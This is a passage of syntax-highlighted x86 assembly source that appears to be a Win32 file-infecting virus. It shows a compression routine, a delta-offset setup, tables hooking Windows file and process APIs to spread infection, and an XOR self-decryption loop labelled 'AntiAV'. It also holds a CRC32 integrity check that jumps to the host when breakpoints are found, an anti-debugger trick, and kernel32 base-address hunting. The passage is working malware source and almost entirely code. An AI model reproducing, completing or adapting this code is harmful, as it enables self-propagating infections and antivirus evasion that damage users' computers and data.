    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">n_search</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_ebx</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;restore all</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;...</span><span class="sc0">
</span><span class="sc1">;stage 4</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                </span><span class="sc1">;EBP = 0</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;EDX = 0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">               </span><span class="sc1">;store decryption key</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">;increment pointer</span><span class="sc0">
</span><span class="sc5">next_byte</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;EAX = 0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">;load next byte</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;ECX = 4</span><span class="sc0">
</span><span class="sc5">next_bits</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;store regs</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">               </span><span class="sc1">;separate bit group</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;compare with next group</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">cb0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;compare with next group</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">cb1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;compare with next group</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">cb2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;store bit 0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">copy_bit</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;store bit 1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">copy_bit</span><span class="sc0">
</span><span class="sc5">cb0</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;store bit 1</span><span class="sc0">
</span><span class="sc5">end_cb1</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">copy_bit</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">next_bits</span><span class="sc0">              </span><span class="sc1">;next bit</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">next_byte</span><span class="sc0">              </span><span class="sc1">;next byte</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;save new size</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_edi</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore all regs</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;test for negative compression</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">c_ok</span><span class="sc0">                 </span><span class="sc1">;positive compression</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">                 </span><span class="sc1">;clear flag</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;and quit</span><span class="sc0">
</span><span class="sc5">c_ok</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">clc</span><span class="sc0">                 </span><span class="sc1">;negative compression, set flag</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;and quit</span><span class="sc0">
</span><span class="sc5">cb1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;store bit 0</span><span class="sc0">
</span><span class="sc5">end_cb2</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">copy_bit</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;store bit 0</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_cb1</span><span class="sc0">
</span><span class="sc5">cb2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;store bit 0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">copy_bit</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;store bit 1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_cb2</span><span class="sc0">
</span><span class="sc5">copy_bit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                </span><span class="sc1">;get byte from EBP</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;make space for next bit</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;set bit</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">cbit</span><span class="sc0">
</span><span class="sc5">BCE32_Compress</span><span class="sc0">  </span><span class="sc9">EndP</span><span class="sc0">                </span><span class="sc1">;end of compression procedure</span><span class="sc0">


</span><span class="sc5">compressed</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;compressed body starts here</span><span class="sc0">
        </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">jmp_host</span><span class="sc4">&gt;</span><span class="sc0">      </span><span class="sc1">;setup SEH frame</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gdlta</span><span class="sc0">                          </span><span class="sc1">;calculate delta offset</span><span class="sc0">
</span><span class="sc5">gdelta</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ddFindFirstFileA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">     </span><span class="sc1">;addresses</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ddFindNextFileA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">      </span><span class="sc1">;of variables</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ddFindClose</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">      </span><span class="sc1">;where will</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ddSetFileAttributesA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0"> </span><span class="sc1">;be stored</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ddSetFileTime</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">        </span><span class="sc1">;addresses of APIs</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ddCreateFileA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ddCreateFileMappingA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ddMapViewOfFile</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ddUnmapViewOfFile</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ddCreateThread</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ddWaitForSingleObject</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ddCloseHandle</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ddCreateMutexA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ddReleaseMutex</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ddOpenMutexA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ddSleep</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ddVirtualProtect</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ddGetCurrentProcessId</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ddOpenProcess</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ddTerminateProcess</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ddLoadLibraryA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ddGetProcAddress</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ddFreeLibrary</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;end of record</span><span class="sc0">

</span><span class="sc5">newHookers</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">newFindFirstFileA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">    </span><span class="sc1">;addresses of API hookers</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">newFindNextFileA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">newCopyFileA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">newCopyFileExA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">newCreateFileA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">newCreateProcessA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">newDeleteFileA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">newGetFileAttributesA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">newGetFullPathNameA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">new_lopen</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">newMoveFileA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">newMoveFileExA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">newOpenFile</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">newSetFileAttributesA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">newWinExec</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">newExitProcess</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">newExitThread</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">newGetLastError</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">newCloseHandle</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;end of record</span><span class="sc0">

</span><span class="sc5">oldHookers</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">oldFindFirstFileA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">    </span><span class="sc1">;addresses, where will be</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">oldFindNextFileA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">     </span><span class="sc1">;stored original</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">oldCopyFileA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">     </span><span class="sc1">;API callers</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">oldCopyFileExA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">oldCreateFileA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">oldCreateProcessA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">oldDeleteFileA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">oldGetFileAttributesA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">oldGetFullPathNameA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">old_lopen</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">oldMoveFileA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">oldMoveFileExA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">oldOpenFile</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">oldSetFileAttributesA</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">oldWinExec</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">oldExitProcess</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">oldExitThread</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">oldGetLastError</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">oldCloseHandle</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc0">

</span><span class="sc5">gdlta</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                 </span><span class="sc1">;get delta offset</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">encrypted</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get start of encrypted code</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">encrypted</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">  </span><span class="sc1">;number of dwords to encrypt</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                 </span><span class="sc1">;save selector</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                  </span><span class="sc1">;ES=DS</span><span class="sc0">
</span><span class="sc5">decrypt</span><span class="sc4">:</span><span class="sc6">lodsd</span><span class="sc0">                   </span><span class="sc1">;load dword</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">;decrypt it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;save dword with AntiAV (usage of</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">decrypt</span><span class="sc0">                </span><span class="sc1">;selectors)</span><span class="sc0">

</span><span class="sc5">encrypted</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;encrypted code starts here</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                  </span><span class="sc1">;restore selector</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">crc32prot</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;start of CRC32 protected code</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">crc32prot</span><span class="sc0">        </span><span class="sc1">;size of that</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRC32</span><span class="sc0">              </span><span class="sc1">;calculate CRC32</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05BB5B647h</span><span class="sc0">         </span><span class="sc1">;check for consistency</span><span class="sc0">
</span><span class="sc5">crc32prot</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">jmp_host</span><span class="sc0">        </span><span class="sc1">;jump to host if breakpoints set and such</span><span class="sc0">

    </span><span class="sc1">;Pentium+ check</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">pushfd</span><span class="sc0">                                  </span><span class="sc1">;save EFLAGS</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;get them</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;save them</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200000h</span><span class="sc0">                         </span><span class="sc1">;flip ID bit in EFLAGS</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;store</span><span class="sc0">
        </span><span class="sc6">popfd</span><span class="sc0">                                   </span><span class="sc1">;flags</span><span class="sc0">
        </span><span class="sc6">pushfd</span><span class="sc0">                                  </span><span class="sc1">;get them back</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">;same?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_cc</span><span class="sc0">                               </span><span class="sc1">;shit, we r on 486-</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;EAX=0</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;EAX=1</span><span class="sc0">
        </span><span class="sc6">cpuid</span><span class="sc0">                                   </span><span class="sc1">;CPUID</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">111100000000b</span><span class="sc0">                  </span><span class="sc1">;mask processor family</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                               </span><span class="sc1">;is it 486?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_cc</span><span class="sc0">                               </span><span class="sc1">;baaaaaaad</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">             </span><span class="sc1">;this will fuck</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;some old versions</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                  </span><span class="sc1">;of NodICE</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">jmp_host</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">77F00000h</span><span class="sc0">          </span><span class="sc1">;WinNT 4.0 k32 image base</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_base</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">k32_found</span><span class="sc0">             </span><span class="sc1">;we got image base</span><span class="sc0">
